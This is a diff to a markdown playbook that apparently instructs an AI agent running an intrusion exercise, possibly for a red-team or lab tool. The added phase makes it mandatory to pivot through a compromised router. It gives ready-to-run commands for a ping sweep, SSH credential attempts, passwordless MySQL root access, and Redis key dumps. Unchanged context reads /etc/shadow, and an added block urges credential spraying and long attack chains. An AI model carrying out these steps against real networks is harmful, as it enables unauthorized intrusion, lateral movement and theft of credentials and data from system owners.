@@ -105,6 +105,33 @@ Continue until no new devices are accessible OR turn 70.
 
 ---
 
+## Phase D2 — Pivot via compromised router/gateway (MANDATORY)
+
+If you have compromised a **router** or **gateway**:
+1. Run a quick internal port scan FROM the compromised device to discover reachable hosts:
+   ```
+   ssh_exec(router_ip, user, password, "for ip in $(seq 1 30); do (ping -c1 -W1 192.168.100.$ip &>/dev/null && echo 192.168.100.$ip up) & done; wait")
+   ```
+2. Try SSH to every discovered IP directly (not just IPs from entry_points):
+   ```
+   try_credential("192.168.100.X", "ssh", user, password)
+   ```
+3. For DB servers (port 3306): try MySQL directly:
+   ```
+   ssh_exec(router_ip, user, password, "mysql -h 192.168.100.X -uroot --connect-timeout=3 -e 'SHOW DATABASES;' 2>/dev/null")
+   ```
+4. For Redis servers (port 6379): probe via router:
+   ```
+   ssh_exec(router_ip, user, password, "redis-cli -h 192.168.100.X --no-auth-warning KEYS '*' 2>/dev/null | head -20")
+   ```
+
+**CRITICAL for chain visualization**: For EVERY hop where you pivot from device A to device B,
+set `pivot_to` in device A's hop entry to device B's IP. This is what draws the attack chain
+on the topology graph. A hop with `pivot_to: null` is a dead end — always set it to the NEXT
+device you moved to, or to the crown jewel you reached via this host.
+
+---
+
 ## Phase E — Crown jewel targeting
 
 Crown jewels (highest priority):
@@ -114,6 +141,9 @@ Crown jewels (highest priority):
 - Any device → ssh_exec(ip, u, p, "cat /etc/shadow 2>/dev/null | head -20")
 
 For each crown jewel reached, document access method and data retrieved.
+
+**Build long chains**: A single-hop intrusion (only the entry point) is incomplete.
+Keep chaining until: all_targets exhausted OR credential spraying fails everywhere OR turn 70.
 
 ---
 
